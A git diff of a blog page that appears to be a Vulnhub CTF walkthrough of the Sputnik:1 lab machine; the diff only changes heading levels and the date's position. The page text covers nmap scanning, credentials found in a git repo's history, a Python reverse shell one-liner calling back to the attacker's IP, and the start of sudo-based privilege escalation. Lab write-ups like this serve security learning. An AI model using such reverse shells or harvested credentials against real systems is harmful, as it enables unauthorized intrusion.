@@ -54,11 +54,11 @@ Contact Me
 <div class="row justify-content-center">
 <div class=col-lg-8>
 <article class=site-blog-details>
-<p><span>September 26, 2020</span> by <span>Nasef</span></p>
 <h2 class=blog-title>Sputnik:1 Vulnhub Walkthrough</h2>
+<p><span>September 26, 2020</span> by <span>Nasef</span></p>
 <img class=feature-image src=https://iamnasef.com/images/blog/featured-image-vulnhub.png alt=blog-feature-image>
 <p>Sputnik:1 is a machine in which I used an enumration to get admin credintials from the history of github repo to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.</p>
-<h2 id=scanning>Scanning</h2>
+<h3 id=scanning>Scanning</h3>
 <p>As always, I started scanning with Nmap</p>
 <pre><code>root@kali:/home/kali# nmap -sC -sV -p- 192.168.198.141
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 08:04 EDT                                                                                           Host is up (0.00067s latency).
@@ -109,7 +109,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 58.58 seconds
 
 </code></pre><p>Four HTTP Services is up, the 8089 is down, the 8191 has only text, the 55555 has falappy bird game, and the 61337 has splunk enterprise page which requires user and password.</p>
-<h2 id=git-history>Git History</h2>
+<h3 id=git-history>Git History</h3>
 <p>I tried SQLmap then bruteforcing the 61337 but it&rsquo;s neither vulerable to SQL Injector nor I got the creds by bruteforcing. the nmap result above shows /.git/ directory so I started reading the files until I got the repo&rsquo;s clone url.</p>
 <p><img src=/images/blog/004/1.png alt=Username></p>
 <p>so I cloned it and browsed it&rsquo;s history until I got a secret file contains a credintials. I tried the credintials on the 61337 http service and it worked!</p>
@@ -178,17 +178,17 @@ root@kali:/home/kali/Desktop/temp/flappy# cat secret
 sputnik:ameer_says_thank_you_and_good_job
 
 </code></pre><p><img src=/images/blog/004/2.png alt=Username></p>
-<h2 id=basic-shell>Basic Shell</h2>
+<h3 id=basic-shell>Basic Shell</h3>
 <p>I searched for how to get a shell on splunk eterprise and found this amazing article
 <a href=https://github.com/TBGSecurity/splunk_shells>https://github.com/TBGSecurity/splunk_shells</a></p>
 <p>I followed the Instructions mentioned, but the shell I got is kindda broken so I started another shell</p>
-<h3 id=target>Target</h3>
+<h5 id=target>Target</h5>
 <pre><code>root@kali:/home/kali# nc -lvnp 7777
 listening on [any] 7777 ...
 connect to [192.168.198.137] from (UNKNOWN) [192.168.198.141] 47438
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.198.137&quot;,1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 
-</code></pre><h3 id=hacker>Hacker</h3>
+</code></pre><h5 id=hacker>Hacker</h5>
 <pre><code>root@kali:/home/kali# nc -lvnp 1111
 listening on [any] 1111 ...
 connect to [192.168.198.137] from (UNKNOWN) [192.168.198.141] 52444
@@ -196,7 +196,7 @@ connect to [192.168.198.137] from (UNKNOWN) [192.168.198.141] 52444
 $ sudo -l
 sudo: no tty present and no askpass program specified
 $ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
-</code></pre><h2 id=privilege-escalation>Privilege Escalation</h2>
+</code></pre><h3 id=privilege-escalation>Privilege Escalation</h3>
 <p>I ran diffreent Enumeration scripts and found an intersting sudo privilege which allows us to run /bin/ed as root. after searching in the gtfio of how to get a root shell. I ran the following commands.</p>
 <pre><code>splunk@sputnik:/$ sudo -l
 sudo -l
